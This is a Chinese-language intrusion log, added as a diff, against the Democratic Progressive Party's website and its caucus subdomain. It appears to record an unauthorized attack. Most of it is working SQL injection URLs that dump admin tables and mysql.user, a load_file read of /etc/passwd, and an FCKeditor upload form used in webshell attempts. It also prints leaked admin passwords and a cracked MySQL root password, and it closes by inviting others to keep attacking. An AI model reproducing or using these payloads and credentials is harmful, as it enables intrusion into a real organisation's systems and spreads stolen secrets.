@@ -1,0 +1,195 @@
+
+台湾民进党渗透测试报告
+
+
+测试目标http://www.dpp.org.tw
+
+搜集一些基本信息
+
+找到 php统计配置信息,在地址添加 
+info.php 
+phpinfo.php  
+test.php 
+
+
+EDT 2009 i686  
+Apache Version  Apache/2.2.9 (Fedora)  
+Mysql   version  5.0.77  
+网站绝对路径为 /home/html/www
+IP地址为 210.202.78.41
+服务器 22  3306 5900  均不对外开放
+
+
+找到后台登陆页面
+http://www.dpp.org.tw/system
+
+www.Google.com搜索  
+
+site:dpp.org.tw inurl:php  
+
+尝试用啊D查找注入点
+
+啊D未检测到任何注入漏洞
+
+手工检测找到了一个数据库调用链接地址 如下
+
+http://www.dpp.org.tw/news_content.php?kw=&menu_sn=7&sub_menu=44&sn=3575
+
+3575-0 返回正常 ，
+
+3575-1 返回了另一个页面 
+
+因此判断存在注入漏洞，
+
+用order by 爆字段长度为11
+
+http://www.dpp.org.tw/news_content.php?kw=&menu_sn=7&sub_menu=44&sn=3575 and 1=2 union select 1,2,3,4,5,6,7,8,9,10,11
+
+测试了其它地址，均不能进行注入利用。
+
+在Google 查到的所有地址里，发现了Fckeditor目录！
+
+http://www.dpp.org.tw/fckeditor/
+http://www.dpp.org.tw/FCKeditor/editor/filemanager/upload/php/
+
+列出Fckeditor目录的文件。
+
+找到 http://www.dpp.org.tw/FCKeditor/editor/filemanager/upload/test.html 这个上传页面，
+
+connectors选择php,后面两个可以不动。上传英文或数字名称的php或asp马得shell，很是简单。
+
+上传的马一般不改名，遇同名马则改成数组式，故建议不要用中文名。
+
+马的路径直接在下方空白处查看源文件。
+
+File Uploader 选择php，点浏览 选中一个PHP一句话木马。
+
+然后Send it to the server上传    没有成功。
+
+
+在一个漏洞发布网站上搜索Fckeditor爆出的漏洞，并逐一测试。
+
+选了一个上传漏洞进行本地提交。
+
+本地提交代码如下：
+
+<form id="frmUpload" enctype="multipart/form-data" action="http://www.dpp.org.tw/FCKeditor/editor/filemanager/browser/default/connectors/php/connector.php?Command=FileUpload&Type=File&CurrentFolder=/" method="post">
+Upload a new file:<br>
+<input type="file" name="NewFile" size="50"><br>
+<input id="btnUpload" type="submit" value="Upload">
+</form> 
+
+
+测试了公布在网站上的漏洞，依然未能成功。
+
+在子网站 http://caucus.dpp.org.tw/ 上发现了一个发布消息的版块。
+
+点开一个消息，却不是一个数据库调用地址。
+
+http://caucus.dpp.org.tw/notice_content.php
+
+点开其他消息，均是同样的地址页面 http://caucus.dpp.org.tw/notice_content.php
+于是打开WSockExpert 进行抓包，
+
+如下。
+
+POST /notice_content.php HTTP/1.1
+Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/msword, application/vnd.ms-excel, */*
+
+type_id=&only_id=&frompage=notice.php&frompageid=&l_out=&gjz=&act=&edit_sn=&new_id=192
+
+
+得到了消息的数据库调用地址如下
+
+http://caucus.dpp.org.tw/notice_content.php?type_id=&only_id=&frompage=notice.php&frompageid=&l_out=&gjz=&act=&edit_sn=&new_id=192
+经测试此地址存在注入漏洞！
+
+http://caucus.dpp.org.tw/notice_content.php?type_id=&only_id=&frompage=notice.php&frompageid=&l_out=&gjz=&act=&edit_sn=&new_id=192 order by 7
+
+爆出字段长度为7
+
+http://caucus.dpp.org.tw/notice_content.php?type_id=&only_id=&frompage=notice.php&frompageid=&l_out=&gjz=&act=&edit_sn=&new_id=-192 union select 1,2,3,4,5,6,7
+
+
+利用load_file 函数读出了 /etc/passwd 数据
+http://caucus.dpp.org.tw/notice_content.php?type_id=&only_id=&frompage=notice.php&frompageid=&l_out=&gjz=&act=&edit_sn=&new_id=-192+union+select+1+1,2,load_file(0x2F6574632F706173737764),4,5,6,7
+
+http://caucus.dpp.org.tw/notice_content.php?type_id=&only_id=&frompage=notice.php&frompageid=&l_out=&gjz=&act=&edit_sn=&new_id=-192+union+select+1,2,concat(cname,0x7C,pwd),user(),5,6,7 from admin
+
+成功读出了管理名和密码为
+Admin| crito
+
+子网站的后台地址为 http://caucus.dpp.org.tw/system
+
+用 Admin| crito 进入后台 上传文件。
+
+上传一个php一句话后，却不能解析。
+
+上传了py  pl 等脚本，均不能解析。
+
+http://caucus.dpp.org.tw/
+
+子网站与主站调用的不是同一个数据库。
+
+
+http://caucus.dpp.org.tw/ 子网站调用的Mysql数据库 安装在在内网的一台Linux 服务器上,与网站服务器分离。
+
+
+http://caucus.dpp.org.tw/notice_content.php?type_id=&only_id=&frompage=notice.php&frompageid=&l_out=&gjz=&act=&edit_sn=&new_id=-192+union+select+1,2,concat(user,0x7C,password),4,5,6,7 from mysql.user
+
+读出 Mysql 的root 密码  
+
+root  534f83d01d8a4da6
+
+彩虹表破解后为 s1020
+
+再次打开主站，寻找漏洞。
+
+
+原来网站有多语言版本，于是选"日本语"点进去浏览。[u
+
+页面中有这样一个滚动的消息发布模块，眼前一亮。
+
+于是点进去WSockExpert 抓包看数据库调用地址。如下！
+
+http://www.dpp.org.tw/index_en/news_content.php?kw=&menu_sn=&sub_menu=48&show_title=&sn=4260&ad_type=&act=
+
+http://www.dpp.org.tw/index_en/news_content.php?kw=&menu_sn=&sub_menu=48&show_title=&sn=4260-0&ad_type=&act=  返回正常
+
+http://www.dpp.org.tw/index_en/news_content.php?kw=&menu_sn=&sub_menu=48&show_title=&sn=4260-1&ad_type=&act=  返回另一个页面
+
+
+判断存在注入漏洞。
+http://www.dpp.org.tw/index_en/news_content.php?kw=&menu_sn=&sub_menu=48&show_title=&sn=4260 order by 11&ad_type=&act=
+  
+爆出字段为11
+
+http://www.dpp.org.tw/index_en/news_content.php?kw=&menu_sn=&sub_menu=48&show_title=&sn=4260 and 1=2 union select 1,2,3,4,5,6,7,8,9,10,11&ad_type=&act=
+
+and (select count(*) from mysql.user)>0  查看数据库权限。
+
+http://www.dpp.org.tw/index_en/news_content.php?kw=&menu_sn=&sub_menu=47&show_title=&sn=4255 and (select count(*) from mysql.user)>0&ad_type=&act=  返回错误，没有读写权限。
+
+http://www.dpp.org.tw/index_en/news_content.php?kw=&menu_sn=&sub_menu=48&show_title=&sn=4260 and 1=2 union select 1,2,concat(cname,0x7C,pwd),4,5,6,7,8,9,10,11 from admin&ad_type=&act=
+
+爆出管理账号         密码 
+    網站管理人員     duser0729
+
+
+http://www.dpp.org.tw/system/
+进行后台登陆，却提示账号密码错误。
+
+
+注入点把/index_en 目录去掉
+and ord(mid(version(),1,1))>51 判断版本
+
+http://www.dpp.org.tw/news_content.php?kw=&menu_sn=&sub_menu=47&show_title=&sn=4255 and ord(mid(version(),1,1))>51&ad_type=&act=
+
+返回错误，是4.0一下版本。   怀疑主站调用了多个数据库，一个5.0 一个4.0一下。
+
+4.0一下不支持union 联合注入，
+
+也就怪不得 http://www.dpp.org.tw/news_content.php?kw=&menu_sn=7&sub_menu=44&sn=3575
+此注入点无法爆出数据了。到最后也只是进了后台，由于网站被多次搞过，所以管理比较重视安全了。
+
+就写到这里，还请大牛继续渗透。
